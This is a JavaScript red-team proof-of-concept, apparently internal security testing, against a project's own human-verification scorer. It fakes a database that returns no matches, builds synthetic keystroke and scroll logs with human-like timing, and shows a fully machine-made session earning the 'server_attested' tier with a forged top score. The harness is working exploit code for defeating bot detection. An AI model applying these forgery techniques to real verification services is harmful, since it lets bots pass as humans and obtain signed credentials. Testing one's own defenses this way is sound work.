/**
 * round9-vec3-poc.js — Round 9, Vector 3: Input-shaping / logic abuse
 * against proof/functions/server-scorer.js (runWall / extractSessionMetrics).
 *
 * Hostile red-team harness. Requires the REAL exported module — no mocks
 * of the target. Models the exact index.js call path:
 *   meta = scorer.extractSessionMetrics(clean)
 *   walled = await scorer.runWall(meta, { admin })
 *
 * Goal: craft a session object with NO valid human session that yields
 * trust_tier "server_attested" with attacker-controlled high composite.
 *
 * Run: node round9-vec3-poc.js
 */
'use strict';

var scorer = require('../proof/functions/server-scorer.js');

function hr() { console.log('-'.repeat(78)); }

/* Fake firebase-admin whose session_fingerprints query returns ZERO
 * matches. Models: (a) the first replay of a brand-new synthetic
 * fingerprint bucket, OR (b) an attacker who perturbs one statistic to
 * land an empty 100-bucket cell. Trace-novelty then passes (suspicious
 * = false) — exactly what runWall does with this admin. */
function fakeAdminNoMatches() {
  var fs = function () {
    return {
      collection: function () {
        return {
          where: function () { return this; },
          limit: function () { return this; },
          get: function () { return Promise.resolve({ docs: [] }); },
          add: function () { return Promise.resolve(); }
        };
      }
    };
  };
  fs.Timestamp = { fromMillis: function (m) { return m; } };
  fs.FieldValue = { serverTimestamp: function () { return 0; } };
  return { admin: { firestore: fs } };
}

async function attempt(name, session, ctx) {
  hr();
  console.log('### ' + name);
  var meta = scorer.extractSessionMetrics(session);
  console.log('extractSessionMetrics ->', JSON.stringify(meta, function (k, v) {
    if (k === 'eventLog' && v && v.events) {
      return { events_len: v.events.length, duration_ms: v.duration_ms,
               sample: v.events.slice(0, 2) };
    }
    return v;
  }));
  var w = await scorer.runWall(meta, ctx || {});
  console.log('runWall.trustTier        =', w.trustTier);
  console.log('runWall.boundsViolations =', JSON.stringify(w.boundsViolations));
  console.log('runWall.serverRecompute  =', JSON.stringify({
    ok: w.serverRecomputeResult.ok,
    server_composite: w.serverRecomputeResult.server_composite,
    client_composite: w.serverRecomputeResult.client_composite,
    divergence: w.serverRecomputeResult.divergence,
    divergent: w.serverRecomputeResult.divergent,
    signal_scores: w.serverRecomputeResult.signal_scores
  }));
  console.log('runWall.walledOutcome    =', JSON.stringify(w.walledOutcome));
  return w;
}

/* >=20 scroll, 0 motion, 0 keystroke => motionApplicable===false path. */
function scrollOnlyLog(n, durMs) {
  var ev = [], step = durMs / (n + 1);
  for (var i = 0; i < n; i++) ev.push({ type: 'scroll', t: Math.round((i + 1) * step), y: i * 50 });
  return { events: ev, duration_ms: durMs };
}

/* Generic timestamped events, no motion/keys/scroll. motionApplicable
 * stays TRUE (scroll<20, kd<10) so the 0.30 motion weight is in play. */
function genericLog(n, durMs) {
  var ev = [];
  for (var i = 0; i < n; i++) {
    var base = (i / n) * durMs;
    var jit = (Math.sin(i * 1.37) * 0.5 + 0.5) * (durMs / n) * 1.2;
    ev.push({ type: 'evt', t: Math.round(base + jit) });
  }
  ev.sort(function (a, b) { return a.t - b.t; });
  for (var k = 1; k < ev.length; k++) if (ev[k].t <= ev[k - 1].t) ev[k].t = ev[k - 1].t + 1;
  return { events: ev, duration_ms: durMs };
}

/* Synthetic 'kd' (keydown) log with human-plausible inter-key CV.
 * 100% machine-generated — no real keyboard, no real human. */
function authoredKbLog(n, durMs) {
  var ev = [], t = 0, gap = durMs / n;
  for (var i = 0; i < n; i++) {
    var f = 0.4 + 1.6 * (0.5 + 0.5 * Math.sin(i * 2.39 + Math.cos(i)));
    t += Math.max(1, Math.round(gap * f));
    ev.push({ type: 'kd', t: t });
  }
  return { events: ev, duration_ms: Math.max(durMs, t + 50) };
}

(async function main() {
  console.log('ROUND 9 — VECTOR 3 — Input-shaping / logic abuse');
  console.log('Target: proof/functions/server-scorer.js  (REAL exported module)');
  console.log('DIVERGENCE_THRESHOLD =', scorer.DIVERGENCE_THRESHOLD,
              ' VERSION =', scorer.VERSION);

  var admin = fakeAdminNoMatches();
  var noAdmin = {};

  // A — baseline trivial forge (no event log): correctly degrades.
  await attempt('A. Trivial forge composite=0.95, NO event_log (control)', {
    session_id: 's-A', composite: 0.95, duration_sec: 300, interaction_count: 50,
    composition_integrity: { verdict: 'authored' },
    environmental: { loaded: true, bot: false }
  }, noAdmin);

  // B — scroll-only "pure reading" redistribution, modest claim.
  await attempt('B. Scroll-only synthetic log, ci=pasted, composite=0.55', {
    session_id: 's-B', composite: 0.55, duration_sec: 120, interaction_count: 25,
    composition_integrity: { verdict: 'pasted' },
    environmental: { loaded: true, bot: false },
    event_log: scrollOnlyLog(60, 120000)
  }, admin);

  // C — generic-event synthetic log (motion weight in play), composite 0.55.
  await attempt('C. Generic synthetic timing log, ci=pasted, composite=0.55', {
    session_id: 's-C', composite: 0.55, duration_sec: 120, interaction_count: 25,
    composition_integrity: { verdict: 'pasted' },
    environmental: { loaded: true, bot: false },
    event_log: genericLog(400, 120000)
  }, admin);

  // D — generic log, claim pushed to 0.84 (just under the 0.85 bounds gate).
  await attempt('D. Generic synthetic log, composite=0.84 (sub-0.85 gate)', {
    session_id: 's-D', composite: 0.84, duration_sec: 120, interaction_count: 25,
    composition_integrity: { verdict: 'pasted' },
    environmental: { loaded: true, bot: false },
    event_log: genericLog(400, 120000)
  }, admin);

  // E — type-coercion probes on extractSessionMetrics.
  await attempt('E1. composite/duration/interactions as STRINGS', {
    session_id: 's-E1', composite: '0.84', duration_sec: '120',
    interaction_count: '25',
    composition_integrity: { verdict: 'pasted' },
    environmental: { loaded: true, bot: false },
    event_log: genericLog(400, 120000)
  }, admin);

  await attempt('E2. hashes_earned alias (Firestore path) not interaction_count', {
    session_id: 's-E2', composite: 0.84, duration_sec: 120, hashes_earned: 25,
    composition_integrity: { verdict: 'pasted' },
    environmental: { loaded: true, bot: false },
    event_log: genericLog(400, 120000)
  }, admin);

  // F — THE BREAK: synthetic authored-keyboard log defeats the 0.85
  //     bounds gate (authored CI + clean env + dur>=60 + interactions>=5)
  //     AND drives server_composite to 1.0 (motionApplicable===false via
  //     motion-absent + kd>=10), so claimed composite 1.0 is non-divergent.
  var kbLog = authoredKbLog(150, 72000);
  var rrF = scorer.serverRecompute(kbLog, 1.0, kbLog.duration_ms / 1000, 'authored');
  console.log('\n[F precheck] synthetic-kb serverRecompute server_composite =',
              rrF.server_composite, ' signal_scores =',
              JSON.stringify(rrF.signal_scores));
  var wF = await attempt(
    'F. *** SYNTHETIC AUTHORED-KB LOG, claimed composite = 1.0 ***', {
      session_id: 's-F', composite: 1.0,
      duration_sec: Math.round(kbLog.duration_ms / 1000),
      interaction_count: 25,
      composition_integrity: { verdict: 'authored' },
      environmental: { loaded: true, bot: false },
      event_log: kbLog
    }, admin);

  // G — binary-search the MAX claimed composite that still = server_attested.
  hr();
  console.log('### G. MAX claimed composite that still yields server_attested');
  var lo = 0.5, hi = 1.0, best = null;
  for (var it = 0; it < 34; it++) {
    var mid = (lo + hi) / 2;
    var m = scorer.extractSessionMetrics({
      session_id: 's-G', composite: Number(mid.toFixed(5)),
      duration_sec: Math.round(kbLog.duration_ms / 1000), interaction_count: 25,
      composition_integrity: { verdict: 'authored' },
      environmental: { loaded: true, bot: false }, event_log: kbLog
    });
    var wg = await scorer.runWall(m, admin);
    if (wg.trustTier === 'server_attested') { best = mid; lo = mid; } else hi = mid;
  }
  console.log('MAX claimed composite still server_attested =',
              best === null ? '(none)' : best.toFixed(5));

  // VERDICT
  hr();
  var broke = wF.trustTier === 'server_attested' &&
              wF.serverRecomputeResult.client_composite >= 0.5 &&
              wF.boundsViolations.length === 0;
  console.log('VERDICT:');
  console.log('  Case F trust_tier        =', wF.trustTier);
  console.log('  Case F claimed composite =', wF.serverRecomputeResult.client_composite,
              '(-> signed JWT hv.compositeScore via index.js buildCredential L133)');
  console.log('  Case F server_composite  =', wF.serverRecomputeResult.server_composite);
  console.log('  Case F divergent         =', wF.serverRecomputeResult.divergent);
  console.log('  Case F boundsViolations  =', JSON.stringify(wF.boundsViolations));
  if (broke) {
    console.log('\n  >>> BROKE-HARD: server_attested + attacker-controlled composite=1.0');
    console.log('  >>> on a 100%% synthetic event log. No real human session exists.');
  } else {
    console.log('\n  >>> Defense held / soft — see report.');
  }
  hr();
})().catch(function (e) { console.error('HARNESS ERROR:', e && e.stack || e); process.exit(1); });
